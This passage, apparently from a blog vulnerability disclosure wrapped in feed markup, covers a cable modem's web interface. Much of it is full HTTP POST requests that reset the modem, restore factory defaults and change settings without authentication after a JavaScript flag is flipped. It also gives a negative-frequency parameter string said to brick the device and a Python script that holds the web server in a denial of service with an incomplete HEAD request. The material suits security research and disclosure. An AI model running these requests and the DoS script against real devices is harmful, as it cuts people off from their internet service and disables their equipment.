-</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-</span><span class='line'>Origin: http://192.168.100.1
-</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22
-</span><span class='line'>Content-Type: application/x-www-form-urlencoded
-</span><span class='line'>Referer: http://192.168.100.1/RgConfig.asp
-</span><span class='line'>Accept-Encoding: gzip,deflate,sdch
-</span><span class='line'>Accept-Language: en-US,en;q=0.8
-</span><span class='line'>Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
-</span><span class='line'>
-</span><span class='line'>RestoreFactoryDefault=1&ResetReq=0</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And the POST for restarting the modem:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>POST /goform/RgConfig HTTP/1.1
-</span><span class='line'>Host: 192.168.100.1
-</span><span class='line'>Proxy-Connection: keep-alive
-</span><span class='line'>Content-Length: 34
-</span><span class='line'>Cache-Control: max-age=0
-</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-</span><span class='line'>Origin: http://192.168.100.1
-</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22
-</span><span class='line'>Content-Type: application/x-www-form-urlencoded
-</span><span class='line'>Referer: http://192.168.100.1/RgConfig.asp
-</span><span class='line'>Accept-Encoding: gzip,deflate,sdch
-</span><span class='line'>Accept-Language: en-US,en;q=0.8
-</span><span class='line'>Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
-</span><span class='line'>
-</span><span class='line'>RestoreFactoryDefault=0&ResetReq=1</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This page also appears to allow the user the ability to modify modem settings by intercepting the response and modifying a javascript flag:</p>
-
-<p><img class="center" src="http://3.bp.blogspot.com/-SJ6LsHU8-28/UVeuZzI105I/AAAAAAAAAcM/5T3qv2jygZI/s640/config_mod.jpg"></p>
-
-<p>Once we flip the flag var from 1 to 0, we have write access via the web interface.  The write POST is as follows:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>POST /goform/RgConfig HTTP/1.1
-</span><span class='line'>Host: 192.168.100.1
-</span><span class='line'>Proxy-Connection: keep-alive
-</span><span class='line'>Content-Length: 125
-</span><span class='line'>Cache-Control: max-age=0
-</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-</span><span class='line'>Origin: http://192.168.100.1
-</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22
-</span><span class='line'>Content-Type: application/x-www-form-urlencoded
-</span><span class='line'>Referer: http://192.168.100.1/RgConfig.asp
-</span><span class='line'>Accept-Encoding: gzip,deflate,sdch
-</span><span class='line'>Accept-Language: en-US,en;q=0.8
-</span><span class='line'>Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
-</span><span class='line'>
-</span><span class='line'>CmFrequencyPlan=0&CmUpChannelId=1&CmDownstreamFreq=843000000&CmDhcpServer=on&saveChanges=1&RestoreFactoryDefault=0&ResetReq=0</span></code></pre></td></tr></table></div></figure>
-
-
-<p>With this we can totally brick the device (that is, until someone figures all this out) by modifying the stream frequency as follows:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>CmFrequencyPlan=0&CmUpChannelId=0&CmDownstreamFreq=-843000000&CmDhcpServer=on&saveChanges=1&RestoreFactoryDefault=0&ResetReq=0</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This can be fixed by simply restoring the configuration to the factory default through the web interface.  However: with an incomplete HTTP HEAD request, we can completely DoS the web server rendering any attempt to access it from the local network moot.  The code:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>import socket
-</span><span class='line'>
-</span><span class='line'>request = 'HEAD / HTTP/1.1\r\n'\
-</span><span class='line'>          'Connection: Keep-Alive\r\n'\
-</span><span class='line'>          'Content-Length: 50\r\n'\
-</span><span class='line'>          'Host: 192.168.100.1\r\n\r\n'
-</span><span class='line'>try:
-</span><span class='line'>    sock = socket.socket()
-</span><span class='line'>    sock.connect(('192.168.100.1', 80))
-</span><span class='line'>    sock.send(request)
-</span><span class='line'>    print 'Holding the flag...'
-</span><span class='line'>    data = sock.recv(1024)
-</span><span class='line'>except Exception, e: print e
-</span><span class='line'>except KeyboardInterrupt: sock.close()</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Because the web server does not have the entire request, it waits for it in another packet.  Which, of course, never arrives.  We can test this by removing the Content-Length field, which will automatically then close the socket.  Between these two vulnerabilities, the modem is essentially rendered useless until hard booted.</p>
 ]]></content>
   </entry>
   
